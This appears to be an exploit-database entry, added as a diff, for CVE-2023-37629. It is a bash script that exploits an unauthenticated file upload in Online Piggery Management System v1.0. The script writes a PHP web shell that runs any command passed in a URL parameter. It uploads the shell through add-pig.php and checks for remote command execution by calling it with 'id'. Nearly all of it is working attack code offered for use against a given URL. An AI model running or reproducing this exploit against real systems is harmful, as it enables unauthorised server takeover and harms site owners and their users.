@@ -1,0 +1,60 @@
+id: 38879
+date: 07/19/2023
+title: Online Piggery Management System v1.0 - unauthenticated file upload Vulnerability
+author: 1337kid
+cves: CVE-2023-37629
+
+#!/bin/bash
+# Exploit Title: Online Piggery Management System v1.0 - unauthenticated file upload vulnerability
+# Exploit Author: 1337kid
+# Software Link: https://www.sourcecodester.com/php/11814/online-pig-management-system-basic-free-version.html
+# Version: 1.0
+# Tested on: Ubuntu
+# CVE : CVE-2023-37629
+#
+# chmod +x exploit.sh
+# ./exploit.sh web_url
+# ./exploit.sh http://127.0.0.1:8080/
+
+echo "   _____   _____   ___ __ ___ ____   ________ __ ___ ___ "
+echo "  / __\\ \\ / / __|_|_  )  \\_  )__ /__|__ /__  / /|_  ) _ \\"
+echo " | (__ \\ V /| _|___/ / () / / |_ \\___|_ \\ / / _ \\/ /\\_, /"
+echo "  \\___| \\_/ |___| /___\\__/___|___/  |___//_/\\___/___|/_/ "
+echo "                         @1337kid"
+echo 
+
+if [[ $1 == '' ]]; then
+    echo "No URL specified!"
+    exit
+fi
+
+base_url=$1
+
+unauth_file_upload() {
+    # CVE-2023-37629 - File upload vuln
+    echo "Generating shell.php"
+#===========
+cat > shell.php << EOF
+<?php system(\$_GET['cmd']); ?>
+EOF
+#===========
+    echo "done"
+    curl -s -F pigphoto=@shell.php -F submit=pwned $base_url/add-pig.php > /dev/null
+    req=$(curl -s -I $base_url"uploadfolder/shell.php?cmd=id" |  head -1 | awk '{print $2}')
+    if [[ $req == "200" ]]; then
+        echo "Shell uploaded to $(echo $base_url)uploadfolder/shell.php"
+    else
+        echo "Failed to upload a shell"
+    fi
+
+}
+
+req=$(curl -I -s $base_url | head -1 | awk '{print $2}')
+if [[ $req -eq "200" ]]; then
+    unauth_file_upload
+else
+    echo "Error"
+    echo "Status Code: $req"
+fi
+
+#  0day.today [2023-07-24]  #
